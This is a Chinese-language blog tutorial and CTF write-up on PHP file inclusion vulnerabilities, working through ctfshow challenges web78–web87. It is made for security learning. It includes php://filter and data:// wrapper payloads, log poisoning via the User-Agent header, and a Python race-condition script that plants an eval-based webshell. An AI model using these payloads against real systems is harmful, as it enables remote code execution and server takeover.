<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>WEB-文件包含</title>
    <link href="/2024/06/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2024/06/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p>本文讲述web安全里面的文件包含漏洞（持续更新）</p><span id="more"></span><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><hr><h2 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h2><hr><h3 id="what-how"><a href="#what-how" class="headerlink" title="what?how?:"></a>what?how?:</h3><p>为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p><h3 id="敏感函数："><a href="#敏感函数：" class="headerlink" title="敏感函数："></a>敏感函数：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>()<br><span class="hljs-keyword">include_once</span>()<br><span class="hljs-keyword">require</span>()<br><span class="hljs-keyword">require_once</span>()<br><br><span class="hljs-comment">/*include()和require()的区别：</span><br><span class="hljs-comment">require()如果在包含过程中出错，就会直接退出，不执行后续语句</span><br><span class="hljs-comment">include()如果在包含过程中出错，只会提出警告，但不影响后续语句的执行*/</span><br><br>    <br><span class="hljs-comment">//相关函数：</span><br><span class="hljs-comment">/*include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file*/</span><br></code></pre></td></tr></table></figure><h3 id="伪协议常规注入："><a href="#伪协议常规注入：" class="headerlink" title="伪协议常规注入："></a>伪协议常规注入：</h3><p>下面有资源</p><p>php:&#x2F;&#x2F;filter过滤器（不能直接访问那就封装一下），</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?page=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>phpstudy_pro\WWW\feng\php_output.php<br><br></code></pre></td></tr></table></figure><p>下面是一个讲解：</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td><code>resource=&lt;要过滤的数据流&gt;</code></td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td><code>read=&lt;读链的筛选列表&gt;</code></td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td><code>write=&lt;写链的筛选列表&gt;</code></td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td><code>&lt;；两个链的筛选列表&gt;</code></td><td>任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>read参数值可为</p><p>string.strip_tags： 将数据流中的所有html标签清除<br>string.toupper： 将数据流中的内容转换为大写<br>string.tolower： 将数据流中的内容转换为小写<br>convert.base64-encode： 将数据流中的内容转换为base64编码 convert.base64-decode： 与上面对应解码为典型的文件包含漏洞。我们可以通过构造含有漏洞的语句，查看想要看的代码： file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php 。再将得到的base64码解码即可。</p><p>php:&#x2F;&#x2F;filter</p><p>php:&#x2F;&#x2F;filter 是一种元封装器。 设计用于数据流打开时的<a href="https://www.php.net/manual/zh/filters.php">筛选过滤</a>应用 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile() <a href="https://www.php.net/manual/zh/function.file.php">file()</a> 和 [file_get_contents()在数据流内容读取之前没有机会应用其他过滤器。   </p><p>举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/* 这简单等同于： readfile(&quot;http://www.example.com&quot;);</span><br><span class="hljs-comment">  实际上没有指定过滤器 */</span><br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&quot;php://filter/resource=http://www.example.com&quot;</span>);<br><span class="hljs-comment">/* 这会和以上所做的一样，但还会用 ROT13 加密。 */</span><br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&quot;php://filter/read=string.toupper|string.rot13/resource=http://www.example.com&quot;</span>);<br><span class="hljs-comment">/* 这会通过 rot13 过滤器筛选出字符 &quot;Hello World&quot;</span><br><span class="hljs-comment">  然后写入当前目录下的 example.txt */</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;php://filter/write=string.rot13/resource=example.txt&quot;</span>,<span class="hljs-string">&quot;Hello World&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="日志文件包含漏洞："><a href="#日志文件包含漏洞：" class="headerlink" title="日志文件包含漏洞："></a>日志文件包含漏洞：</h3><p>apache服务器日志存放文件位置：&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log，apache日志文件存放着我们输入的url参数，我们可以通过在url参数中写入一句话木马，进行执行，从而将一句话木马写入到日志文件中，我们可以通过包含写入木马的日志文件，从而进行命令执行。</p><p>nginx服务器日志存放位置：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="https://xz.aliyun.com/t/7176?time__1311=n4+xnD0GDtKxyDRxQqGNWP4wYi=Zo+pP4x&alichlgref=https://www.google.com.hk/">https://xz.aliyun.com/t/7176?time__1311=n4%2BxnD0GDtKxyDRxQqGNWP4wYi%3DZo%2BpP4x&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F</a> –基本讲解</p><p><a href="https://www.cnblogs.com/chu-jian/p/17481660.html#:~:text=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88File%20Inclusion,%E4%BB%A3%E7%A0%81%E4%BD%9C%E4%B8%BA%E6%AD%A3%E5%B8%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E3%80%82">https://www.cnblogs.com/chu-jian/p/17481660.html#:~:text=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88File%20Inclusion,%E4%BB%A3%E7%A0%81%E4%BD%9C%E4%B8%BA%E6%AD%A3%E5%B8%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E3%80%82</a> –基本讲解</p><p><a href="https://blog.csdn.net/wangyuxiang946/article/details/131149171">https://blog.csdn.net/wangyuxiang946/article/details/131149171</a> –filter过滤器</p><p><a href="https://www.cnblogs.com/kuaile1314/p/11897097.html">https://www.cnblogs.com/kuaile1314/p/11897097.html</a> –伪协议</p><p><a href="https://blog.csdn.net/qq_50673174/article/details/124769364">https://blog.csdn.net/qq_50673174/article/details/124769364</a> –伪协议</p><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121276653">https://blog.csdn.net/unexpectedthing/article/details/121276653</a> –伪协议</p><p><a href="https://blog.csdn.net/hsd2012/article/details/51194554?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-51194554-blog-100028185.pc_relevant_vip_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-51194554-blog-100028185.pc_relevant_vip_default&utm_relevant_index=3">https://blog.csdn.net/hsd2012/article/details/51194554?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-51194554-blog-100028185.pc_relevant_vip_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-51194554-blog-100028185.pc_relevant_vip_default&amp;utm_relevant_index=3</a>  –php标签</p><p><a href="https://www.cnblogs.com/GTL-JU/p/16831597.html">https://www.cnblogs.com/GTL-JU/p/16831597.html</a> –日志文件包含漏洞</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><hr><h3 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h3><hr><h4 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h4><h5 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 10:52:43</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><h5 id="考察点："><a href="#考察点：" class="headerlink" title="考察点："></a>考察点：</h5><p>基本文件包含，敏感函数</p><h5 id="详解："><a href="#详解：" class="headerlink" title="详解："></a>详解：</h5><p>没有任何过滤，直接传文件就OK。可读取可执行恶意代码。</p><p>payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">?file=data://text/plain,<span class="hljs-meta">&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="WEB79"><a href="#WEB79" class="headerlink" title="WEB79"></a>WEB79</h4><h5 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="详解：-1"><a href="#详解：-1" class="headerlink" title="详解："></a>详解：</h5><p>无伤大雅，替换php，那就用**&lt;?&#x3D;**，还可以大小写绕过+input协议</p><p><a href="https://www.ctf.show/writeups/835619">https://www.ctf.show/writeups/835619</a>  –多个法子（里面有php标签用法哦），</p><p>payload:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">/?<span class="hljs-built_in">file</span>=data://<span class="hljs-keyword">text</span>/plain,<span class="hljs-meta">&lt;?</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls%&#x27;</span><span class="hljs-string">&#x27;);?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="Web80"><a href="#Web80" class="headerlink" title="Web80"></a><strong>Web80</strong></h4><h5 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="考察点：-1"><a href="#考察点：-1" class="headerlink" title="考察点："></a>考察点：</h5><p>日志注入，php:&#x2F;&#x2F;input+post+burpsuite</p><h5 id="详解：-2"><a href="#详解：-2" class="headerlink" title="详解："></a>详解：</h5><p>还是无伤大雅，过滤了php和data，那换一种方法（Php这样可以，Data不行那）</p><p>不行有伤大雅了，差了很多基本是伪协议不好使，但是可以用php:&#x2F;&#x2F;input协议–（后面其实可以url编码）</p><p>放个图：</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB140a0d2732011ed137886a4bc4e013b0?method=download&shareKey=49a089d16fdf9120b00710810e8e3926" alt="f56ed2d9a9d0e86220976ea6a93e658"></p><p>其次另外一种主流做法就是日志文件包含漏洞，这种做法一般是伪协议不能用再来使用，我们先抓个包：</p><p>显而易见看到是nginx服务，我们知道常规路径是&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，去访问一下。ua信息等，这里ua最容易控制，抓包改ua，写入一句话木马或者命令执行都可以</p><p>下步骤做题</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB41cee5b9d3b102f3dba07d7f66b6b714?method=download&shareKey=e2689e80361355090c43cf42b6f43cc9" alt="ed12cf6cf24996fd8dd12e1334fb78a"></p><p>最主要的就是找到文件所在地址和在ua哪里写入php语句。</p><h4 id="WEB81"><a href="#WEB81" class="headerlink" title="WEB81"></a>WEB81</h4><h5 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="详解：-3"><a href="#详解：-3" class="headerlink" title="详解："></a>详解：</h5><p>多了层过滤而已，这个是不能用php:&#x2F;&#x2F;input罢了。修改ua用日志漏洞。</p><h4 id="WEB82"><a href="#WEB82" class="headerlink" title="WEB82"></a>WEB82</h4><h5 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="考察点：-2"><a href="#考察点：-2" class="headerlink" title="考察点："></a>考察点：</h5><p>条件竞争（burp上传或者python脚本），session.upload_progress 包含文件漏洞</p><h5 id="详解：-4"><a href="#详解：-4" class="headerlink" title="详解："></a>详解：</h5><p>过滤了点之后我们也不能使用文件包含来getshell了，因此我们只能利用无后缀的文件，因为在php中我们能够利用的无后缀的文件就是session，我们可以利用<code>session.upload_progress</code>来进行文件包含，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>参数，上传成功后，就会在session<code>[&#39;upload_progress_123&#39;]</code>存储一些本次上传的相关信息</p><p>但是由于<code>cleanup=on</code>，会导致文件上传后，session文件的内容立即清空。此时我们得利用条件竞争，在session文件的内容被清空前进行文件包含。</p><p>开始做题：</p><p>自己讲一下条件竞争：</p><p><strong>Attack–burpsuite</strong></p><p>1.上传父文件（一句话木马的文件名）&#x3D;&#x3D;（被删除）&#x3D;&gt;抓包利用burpsuite-Intruder不停上传（设置好步长和次数）：</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB34bef12b701d76045a743d72010e9a52?method=download&shareKey=d36a1a21bb236a1aa64d8d30b49aafda" alt="img"></p><p>2.另开一burpsuite窗口不断访问a.php（父文件）文件以生成1.php，注意新开的要把代理开关打开，把刚刚的关掉&#x3D;&gt;双窗口观察直到找到访问状态码为200的一栏，表示文件上传成功，继续接下来的操作得到flag.</p><p><strong>Attack–python</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>sessid = <span class="hljs-string">&#x27;Qftm&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        session.post(<br>            <span class="hljs-string">&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/&#x27;</span>,<br>            data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="hljs-string">&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[mtfQ])?&gt;&#x27;);?&gt;&quot;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;q.txt&#x27;</span>, f)&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;<br>        )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">READ</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        response = session.get(<span class="hljs-string">f&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+++]retry&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            sys.exit(<span class="hljs-number">0</span>)<br><br><br><span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>    t1 = threading.Thread(target=POST, args=(session, ))<br>    t1.daemon = <span class="hljs-literal">True</span><br>    t1.start()<br><br>    READ(session)<br><br></code></pre></td></tr></table></figure><h5 id="资源："><a href="#资源：" class="headerlink" title="资源："></a>资源：</h5><p><a href="https://blog.csdn.net/weixin_45785288/article/details/110625807?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-4.pc_relevant_default&spm=1001.2101.3001.4242.3&utm_relevant_index=7">ctfshow]web入门文件包含78-88_ctfshow web入门78-CSDN博客</a>  –参考wp</p><p>条件竞争三板斧文章：</p><p><a href="https://xz.aliyun.com/t/13292?time__1311=mqmxnDBD9DyGeAKDsD7mG77gx7Kqxg+S+TD&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/13292?time__1311=mqmxnDBD9DyGeAKDsD7mG77gx7Kqxg%2BS%2BTD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p><a href="https://xz.aliyun.com/t/13325?time__1311=mqmxnDBG0QDQG=YDs=oYK0=g2RjiNiN4D&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/13325?time__1311=mqmxnDBG0QDQG%3DYDs%3DoYK0%3Dg2RjiNiN4D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p><a href="https://xz.aliyun.com/t/13326?time__1311=mqmxnDBG0QDQG=qDs=oYK0=g2Rjir=74D&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/13326?time__1311=mqmxnDBG0QDQG%3DqDs%3DoYK0%3Dg2Rjir%3D74D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p><a href="https://ciphersaw.me/ctf-wiki/pwn/linux/race-condition/introduction/">https://ciphersaw.me/ctf-wiki/pwn/linux/race-condition/introduction/</a> –条件竞争介绍</p><p><a href="https://cloud.tencent.com/developer/article/1516412">https://cloud.tencent.com/developer/article/1516412</a>  –条件文章</p><h4 id="WEB87"><a href="#WEB87" class="headerlink" title="WEB87"></a>WEB87</h4><h5 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>), <span class="hljs-string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="hljs-variable">$content</span>);<br><br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="考察点：-3"><a href="#考察点：-3" class="headerlink" title="考察点："></a>考察点：</h5><p>写文件关键函数，过滤绕过，url编码，伪协议和filter过滤器</p><h5 id="详解：-5"><a href="#详解：-5" class="headerlink" title="详解："></a>详解：</h5><p>首先看到还是常规过滤，但是有一个关键是file_put_contents函数还有urldecode解码函数，这里需要注意的一点的操作就是文件写入和url二次编码的问题，注意只需要对文件名字二次编码即可,过滤器利用write写入文件即可</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=php:<span class="hljs-comment">//filter/write=string.rot13/resource=2.php</span><br><span class="hljs-comment">//string.rot13  十三位回转编码</span><br><span 